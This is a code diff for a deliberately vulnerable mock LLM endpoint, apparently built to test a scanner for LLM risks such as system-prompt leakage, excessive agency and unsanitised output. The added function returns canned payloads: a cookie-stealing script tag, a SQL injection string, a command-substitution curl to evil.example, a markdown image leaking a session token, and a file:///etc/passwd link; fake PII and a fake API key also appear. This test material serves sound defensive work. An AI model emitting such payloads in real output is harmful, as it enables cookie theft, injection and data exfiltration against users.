@@ -41,6 +41,26 @@ function asksForAction(prompt: string): boolean {
   return /\b(tool|delete|shell|execute|admin api|grant|refund|payments|rm\s+-rf)\b/i.test(prompt);
 }
 
+/** Canned raw, downstream-dangerous output, by the kind of artefact requested. */
+function unsafeOutputFor(prompt: string): string | null {
+  if (/\b(html|banner)\b/i.test(prompt)) {
+    return '<div class="welcome">Hi <script>alert(document.cookie)</script></div>';
+  }
+  if (/\b(sql|where clause)\b/i.test(prompt)) {
+    return "SELECT * FROM users WHERE username = '' OR '1'='1';";
+  }
+  if (/\b(bash|command)\b/i.test(prompt)) {
+    return "Here you go: tar czf logs.tgz ./logs; $(curl http://evil.example/x)";
+  }
+  if (/\bmarkdown\b/i.test(prompt)) {
+    return "Note:\n\n![pixel](http://evil.example/log?d=SESSION_TOKEN)";
+  }
+  if (/\b(url|link)\b/i.test(prompt)) {
+    return "Sure: file:///etc/passwd";
+  }
+  return null;
+}
+
 /** Fake PII/secrets the vulnerable mock spills when asked. */
 const FAKE_PII =
   "Sure: email john.doe@example.com, phone +1 (415) 555-0142, card 4242 4242 4242 4242 exp 12/29 CVV 123, SSN 123-45-6789, key sk-live-aB3dEfGhIjKlMnOpQrStUv.";
@@ -66,6 +86,9 @@ export function vulnerableEndpoint(): Endpoint {
     // Excessive agency: emit a tool call / destructive confirmation when told to
     // act (checked before PII so an "email" action isn't mistaken for a PII ask).
     if (asksForAction(prompt)) return FAKE_TOOL_CALL;
+    // Improper output handling: pass raw dangerous content through unsanitised.
+    const unsafe = unsafeOutputFor(prompt);
+    if (unsafe) return unsafe;
     // System-prompt leakage: divulge its instructions when fished for them.
     if (asksForInternals(prompt)) return FAKE_SYSTEM_PROMPT;
     // Sensitive disclosure: spill PII/secrets when asked.
